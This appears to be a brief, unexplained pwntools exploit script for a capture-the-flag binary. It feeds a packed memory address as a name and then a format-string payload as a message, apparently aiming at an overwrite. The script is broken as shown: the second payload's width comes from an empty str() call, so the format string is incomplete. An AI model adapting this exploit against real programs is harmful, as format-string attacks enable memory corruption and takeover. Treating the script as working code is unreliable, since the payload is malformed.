from pwn import *

def respone(recv_buf, send_buf,new_line=True):
	p.recvuntil(recv_buf)
	if new_line:
		p.sendline(send_buf)
	else:
		p.send(send_buf)

p = process('./what_the_fuck')
payload1 = p64(0x0000000000601020)
respone('input your name: ',payload1)
print(p.recvline())	#print name
payload2 = '%.'+str()+'d'+'%'
respone('leave a msg: ',payload2)
print(p.recvline())
